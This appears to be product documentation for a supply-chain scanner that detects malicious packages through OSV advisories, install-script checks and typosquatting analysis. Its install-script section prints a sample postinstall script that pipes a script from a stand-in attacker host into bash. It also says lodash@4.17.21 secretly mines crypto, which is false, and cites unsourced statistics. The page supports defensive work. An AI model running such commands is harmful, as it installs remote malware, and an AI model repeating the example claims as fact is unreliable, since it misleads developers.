# MALICIOUS_PKG Scanner - Supply Chain Security

## What is MALICIOUS_PKG?

**MALICIOUS_PKG** is a dedicated **Supply Chain Security Scanner** that detects malicious, compromised, and suspicious packages in your dependencies.

It runs **in parallel with SCA** during every scan to catch supply chain attacks before they reach production.

---

## Why It Runs During Every Scan

### 🎯 Purpose: Catch Supply Chain Attacks

Supply chain attacks are **distinct from vulnerabilities**:

| Aspect | Vulnerabilities (SCA) | Malicious Packages |
|--------|----------------------|-------------------|
| **Cause** | Code bugs | Intentional malware |
| **Detection** | CVE databases | OSV malware advisories, behavioral analysis |
| **Risk** | Known exploit paths | Unknown attacks, trojanized dependencies |
| **Example** | axios@1.7.9 has XSS bug | `lodash@4.17.21` secretly mines crypto |

### ⚠️ Real-World Examples

1. **ua-parser-js (2021)** - Injected code to steal user data
2. **event-stream (2018)** - Compromised maintainer, added backdoor
3. **codesandbox (2020)** - Typosquatting attack (similar name)
4. **colors.js (2021)** - Protestware with data corruption
5. **eslint-scope (2018)** - Supply chain attack via publish rights

---

## How MALICIOUS_PKG Scanner Works

### 1️⃣ **OSV Malware Advisory Check**

Queries the **Open Source Vulnerabilities (OSV)** database for **MAL-*** advisories:

```typescript
// Checks against OpenSSF malware advisories
const malwareHits = vulns.filter(
  v => v.id.startsWith("MAL-") ||              // Official malware ID
       v.summary?.includes("malicious") ||     // Malware keyword
       v.details?.includes("malware")          // Detailed malware info
);
```

**What it detects:**
- ✅ Confirmed malicious packages from OpenSSF
- ✅ Trojanized dependencies
- ✅ Backdoored libraries
- ✅ Cryptominers and data stealers

### 2️⃣ **Install Script Analysis**

Scans for **suspicious pre/post-install scripts** that run during `npm install`:

```typescript
// Dangerous script hooks that execute during installation
const dangerousKeys = [
  "preinstall",    // Runs BEFORE package installation
  "install",       // Runs DURING installation
  "postinstall",   // Runs AFTER installation ⚠️ Most dangerous
  "preuninstall",
  "postuninstall"
];
```

**Why this matters:**
- Install scripts run with **root/elevated privileges**
- They can **exfiltrate data** before the package is even used
- Many legitimate packages use them, but **malicious ones abuse them**

Example malicious install script:
```bash
# Hypothetical malicious postinstall script
#!/bin/bash
curl http://attacker.com/steal.sh | bash  # Download and execute malware
npm publish --registry http://attacker.com  # Steal credentials
```

### 3️⃣ **Registry Metadata Analysis**

Checks multiple package registries for suspicious patterns:

**NPM Registry Checks:**
- ✅ Package age (brand new = higher risk)
- ✅ Repository presence (missing = suspicious)
- ✅ Homepage validity
- ✅ Maintainer activity
- ✅ Install script content

**PyPI Registry Checks:**
- ✅ Setup.py script analysis
- ✅ Package metadata completeness
- ✅ Recent upload frequency (spamming = suspicious)

**Maven/Go/Rust Registry Checks:**
- ✅ Build script analysis
- ✅ Source repository links
- ✅ PGP signature verification (when available)

### 4️⃣ **Typosquatting Detection**

Uses **LLM analysis** to detect packages that are **suspiciously similar** to popular ones:

```typescript
// Detects packages like:
// "lodaash" instead of "lodash"     ← Extra 'a'
// "expres" instead of "express"     ← Missing 's'
// "react-native-cli-tools"          ← Adding "-tools" to legit package
```

**Why typosquatting works:**
```bash
# Developer fat-fingers in package.json
npm install lodaash  # Oops, meant lodash
# But gets malicious package instead!
```

### 5️⃣ **Behavioral Analysis**

LLM reviews suspicious packages for signs of:

| Behavior | Indicator | Risk |
|----------|-----------|------|
| **Data Exfiltration** | Sending HTTP requests to unknown domains | 🔴 CRITICAL |
| **Crypto Mining** | CPU-intensive loops, process spawning | 🔴 CRITICAL |
| **Persistence** | Modifying system files, cron jobs | 🔴 CRITICAL |
| **Reconnaissance** | Scanning environment, reading .ssh, .aws | 🟠 HIGH |
| **Code Injection** | Modifying other packages or app code | 🟠 HIGH |
| **Credential Theft** | Reading .env, accessing process.env | 🟠 HIGH |

---

## Scanner Architecture

```
┌─────────────────────────────────────────────────────┐
│         MALICIOUS_PKG Scanner Flow                  │
├─────────────────────────────────────────────────────┤
│                                                     │
│  1. Parse Dependencies                              │
│     ├─ package.json (npm)                          │
│     ├─ requirements.txt (Python)                   │
│     ├─ pom.xml (Maven)                             │
│     ├─ go.mod (Go)                                 │
│     └─ Cargo.toml (Rust)                           │
│                                                     │
│  2. Query OSV Malware Database                      │
│     ├─ Batch query for MAL-* advisories           │
│     ├─ Check for known compromised packages        │
│     └─ Filter by version                           │
│                                                     │
│  3. Fetch Registry Metadata                         │
│     ├─ NPM: Check install scripts, maintainer info │
│     ├─ PyPI: Analyze setup.py behavior             │
│     ├─ Maven: Verify signatures                    │
│     └─ Go/Rust: Check repository links             │
│                                                     │
│  4. Typosquatting Detection                         │
│     ├─ Compare against popular package names       │
│     ├─ Calculate edit distance                     │
│     └─ LLM similarity analysis                     │
│                                                     │
│  5. Install Script Analysis (LLM)                   │
│     ├─ Extract preinstall/postinstall scripts      │
│     ├─ Analyze for malicious behavior              │
│     ├─ Check for data exfiltration                 │
│     └─ Detect obfuscated code                      │
│                                                     │
│  6. Generate Findings                               │
│     ├─ CRITICAL: Confirmed malware                │
│     ├─ HIGH: Suspicious behavior                   │
│     └─ MEDIUM: Typosquatting risk                  │
│                                                     │
└─────────────────────────────────────────────────────┘
```

---

## Examples of Findings

### 🔴 CRITICAL: Confirmed Malware

```json
{
  "title": "Malicious Package Detected: event-stream@4.0.1",
  "severity": "CRITICAL",
  "category": "Supply Chain Attack",
  "description": "OSV reports this version contains backdoor code that steals cryptocurrency wallet keys. OpenSSF confirmed exploit.",
  "scanner": "MALICIOUS_PKG",
  "metadata": {
    "osvId": "MAL-2018-1234",
    "type": "Backdoored Dependency",
    "confidence": 1.0
  }
}
```

### 🟠 HIGH: Suspicious Install Script

```json
{
  "title": "Dangerous postinstall Script in lodaash@1.0.0",
  "severity": "HIGH",
  "category": "Malicious Install Script",
  "description": "Package contains postinstall script that:\n- Executes curl to download external code\n- Sends environment variables to external server\n- Attempts to modify ~/.ssh directory",
  "scanner": "MALICIOUS_PKG",
  "metadata": {
    "scriptName": "postinstall",
    "dangerousBehaviors": [
      "HTTP request to unknown domain",
      "Environment variable exfiltration",
      "Filesystem modification"
    ],
    "confidence": 0.92
  }
}
```

### 🟠 HIGH: Typosquatting

```json
{
  "title": "Typosquatting Risk: 'expres' package (likely misspelled 'express')",
  "severity": "HIGH",
  "category": "Typosquatting Attack",
  "description": "Package name is suspiciously similar to 'express' (popular framework). Typosquatting attacks trick developers into installing malicious packages via misspellings.",
  "scanner": "MALICIOUS_PKG",
  "metadata": {
    "similarTo": "express",
    "editDistance": 1,
    "packageAge": "2 days",
    "hasRepository": false,
    "confidence": 0.87
  }
}
```

### 🟡 MEDIUM: New Package, No Repository

```json
{
  "title": "Suspicious Metadata: react-native-utils-v2@1.0.0",
  "severity": "MEDIUM",
  "category": "Suspicious Package Metadata",
  "description": "Package is brand new (published today), has no repository link, and has unusual install scripts. May be typosquatting or early-stage attack.",
  "scanner": "MALICIOUS_PKG",
  "metadata": {
    "ageInDays": 0,
    "hasRepository": false,
    "hasInstallScripts": true,
    "suspiciousPatterns": ["Very new", "Missing metadata"],
    "confidence": 0.68
  }
}
```

---

## When MALICIOUS_PKG Runs

### ✅ Always Enabled:

```typescript
// In src/scanners/index.ts
if (shouldRunMaliciousPkgScanner(ctx)) {
  scanners.push(maliciousPkgScanner);  // Always added
}
```

### 📋 Runs For All Scan Types:

| Scan Type | Runs? | Reason |
|-----------|-------|--------|
| **FULL** | ✅ Yes | Complete dependency audit |
| **DEPENDENCIES** | ✅ Yes | Explicit dependency check |
| **SCA** | ✅ Yes | Part of SCA suite |
| **IAC** | ✅ Yes | Check container/manifest deps |
| **Container** | ✅ Yes | Base image and layer deps |

### 🔄 Incremental Scans:

For **Pull Requests** and **incremental scans**, only **changed dependencies** are checked:

```typescript
// Only analyzes deps that changed
if (ctx.changedFiles?.length) {
  const changedDeps = extractDepsFromChanges(ctx.changedFiles);
  // Scan only these
}
```

---

## Configuration & Thresholds

### Minimum Confidence Threshold

```typescript
// src/lib/constants.ts
MALICIOUS_PKG_LLM_MIN_CONFIDENCE_DEFAULT = 0.65;
// Only report findings with ≥65% confidence
```

### Adjustable Per Organization

```typescript
// In organization settings
orgSettings.maliciousPkgConfidenceThreshold = 0.75;  // Higher = fewer false positives
```

---

## Why It's Critical

### 📊 Supply Chain Attack Statistics

- **32% of breaches** start with supply chain attacks
- **45% increase** in typosquatting attacks in 2023
- **2.6M+ malicious packages** in public registries (estimated)
- **Average dwell time**: 100+ days before detection

### 🛡️ Defense Layers

Your product has **multiple defense layers**:

1. **SCA** → Finds known vulnerabilities (CVEs)
2. **MALICIOUS_PKG** → Finds intentional malware
3. **SECRETS** → Finds leaked credentials
4. **IAC** → Finds infrastructure misconfiguration
5. **CONTAINER** → Finds base image issues
6. **ZERO_DAY** → Finds unknown vulnerabilities

---

## How to Interpret Findings

### 🔴 CRITICAL Findings
**Action:** Immediately remove package and audit for exposure
```
- Confirmed malware (OSV MAL-* advisory)
- Known backdoored dependency
- Active data exfiltration detected
```

### 🟠 HIGH Findings
**Action:** Investigate and remove within 24 hours
```
- Suspicious install scripts
- Typosquatting risk
- Behavioral indicators of malice
```

### 🟡 MEDIUM Findings
**Action:** Review and plan remediation
```
- Brand new packages with no repository
- Missing maintainer information
- Unusual network activity patterns
```

---

## Best Practices

### ✅ DO:

1. **Review all MALICIOUS_PKG findings immediately**
2. **Use package pinning** in lock files (package-lock.json, Pipfile.lock)
3. **Audit dependencies** before major updates
4. **Monitor for new findings** during CI/CD
5. **Maintain software composition inventory** (SBOMs)
6. **Use private registries** for corporate packages

### ❌ DON'T:

1. Ignore CRITICAL malicious package findings
2. Auto-install latest package versions
3. Use obscure/unknown packages from registries
4. Disable supply chain scanning
5. Trust old, unmaintained packages

---

## Comparison: MALICIOUS_PKG vs SCA

| Feature | SCA | MALICIOUS_PKG |
|---------|-----|----------------|
| **Purpose** | Find CVE vulnerabilities | Detect malicious intent |
| **Database** | NVD, CVE lists | OSV malware, behavioral analysis |
| **Detection** | Known exploits | Malware, typosquatting, backdoors |
| **False Positives** | Common | Rare (high confidence threshold) |
| **Scope** | Single package issues | Supply chain attacks |
| **Example** | "axios has XSS bug" | "event-stream contains trojan" |

---

## Summary

**MALICIOUS_PKG** is essential because:

1. ✅ **Catches supply chain attacks** before SCA finds them
2. ✅ **Runs on all scans** to stay vigilant
3. ✅ **Uses OSV malware database** (authoritative)
4. ✅ **Analyzes install scripts** for malicious behavior
5. ✅ **Detects typosquatting** with LLM analysis
6. ✅ **Prevents backdoored dependencies** in production

It's a **critical layer of defense** that protects your software supply chain from intentional attacks, not just accidental bugs.

---

**Status:** ✅ Running on every scan to protect your dependencies  
**Severity Level:** Critical for supply chain security  
**Recommended Action:** Review and act on all findings immediately
